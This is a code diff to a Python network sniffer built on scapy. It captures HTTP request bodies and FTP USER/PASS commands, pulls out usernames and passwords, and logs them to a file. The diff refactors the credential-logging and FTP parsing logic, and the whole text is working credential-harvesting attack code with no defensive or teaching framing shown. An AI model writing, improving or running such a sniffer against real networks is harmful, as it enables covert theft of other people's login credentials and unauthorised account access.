@@ -17,9 +17,34 @@ def get_interface():
     return args.interface, args.time, args.count
 
 def log_credential(creds):
-    with open(LOG_FILE, "a") as f:
-        f.write(f"{creds}\n")
+    try:
+        with open(LOG_FILE, "a") as f:
+            timestamp = creds['timestamp']
+            protocol = creds['protocol']
+            source = creds['src']
+            destination = creds['dst']
+            username_fields = creds.get('username_fields', [])
+            password_fields = creds.get('password_fields', [])
+            
+            log_entry = f"[{timestamp}] {protocol} {source}->{destination} "
+            for field_type, fields in [("Usernames", username_fields), ("Passwords", password_fields)]:
+                if fields:
+                    log_entry += f"{field_type}: " + ", ".join(f"{field_name}:{field_value}" for field_name, field_value in fields) + " "
+            
+            f.write(log_entry.strip() + "\n")
+    except KeyError as e:
+        print(f"[ERROR] Data Missing from file.{e}")
 
+def create_creds(protocol, packet, timestamp, username_fields=[], password_fields=[]):
+    return {
+        'protocol': protocol,
+        'src': packet[scapy.IP].src,
+        'dst': packet[scapy.IP].dst,
+        'timestamp': timestamp,
+        'username_fields': username_fields,
+        'password_fields': password_fields
+    }
+        
 def process_packet(packet):
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
     if packet.haslayer(http.HTTPRequest):
@@ -28,13 +53,7 @@ def process_packet(packet):
             user_fields = re.findall(r"(username|user|email)=([^&\s]+)", load, re.I)
             pass_fields = re.findall(r"(password|pass|pwd)=([^&\s]+)", load, re.I)
             if user_fields or pass_fields:
-                creds = {
-                    'protocol': 'HTTP',
-                    'src': packet[scapy.IP].src,
-                    'dst': packet[scapy.IP].dst,
-                    'timestamp': timestamp,
-                    'fields': user_fields + pass_fields
-                }
+                creds = create_creds('HTTP', packet, timestamp, user_fields, pass_fields)
                 log_credential(creds)
                 print(f"[HTTP] Credentials Detected: {creds}")
     # FTP (port 21, TCP)
@@ -43,15 +62,15 @@ def process_packet(packet):
             load = packet[scapy.Raw].load.decode(errors='ignore')
             if "USER" in load or "PASS" in load:
                 parts = load.strip().split()
-                creds = {
-                    'protocol': 'FTP',
-                    'src': packet[scapy.IP].src,
-                    'dst': packet[scapy.IP].dst,
-                    'timestamp': timestamp,
-                    'fields': [tuple(parts[:2])]
-                }
-                log_credential(creds)
-                print(f"[FTP] Credentials Detected: {creds}")
+                if len(parts) >= 2:
+                    user_fields, pass_fields = [], []
+                    if "USER" in parts[0]:
+                        user_fields = [tuple(parts[:2])]
+                    elif "PASS" in parts[0]:
+                        pass_fields = [tuple(parts[:2])]
+                    creds = create_creds('FTP', packet, timestamp, user_fields, pass_fields)
+                    log_credential(creds)
+                    print(f"[FTP] Credentials Detected: {creds}")
 
 def main():
     iface, duration, count = get_interface()
